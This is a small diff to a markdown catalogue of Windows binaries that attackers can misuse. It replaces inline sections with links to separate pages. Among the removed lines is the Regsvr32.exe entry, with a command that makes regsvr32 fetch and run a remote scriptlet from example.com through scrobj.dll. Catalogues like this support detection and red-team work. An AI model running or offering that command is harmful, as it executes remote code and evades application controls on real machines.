@@ -5,22 +5,8 @@ If you are missing from the acknowledgement, please let me know (I did not forge
    
 # OS BINARIES
    
-#include "OSBinaries/Rundll32.md"
-
-[this subtext](OSBinaries/Rundll32.md)
-   
-   
-## Regsvr32.exe
-  
-* Functions: Execute
-
-```
-regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
-```
-   
-Acknowledgements:
-* Casey Smith - @subtee
-   
+[Rundll32.exe](OSBinaries/Rundll32.md)
+[Regsvr32.exe](OSBinaries/Regsvr32.md)   
    
    
 ## Msbuild.exe
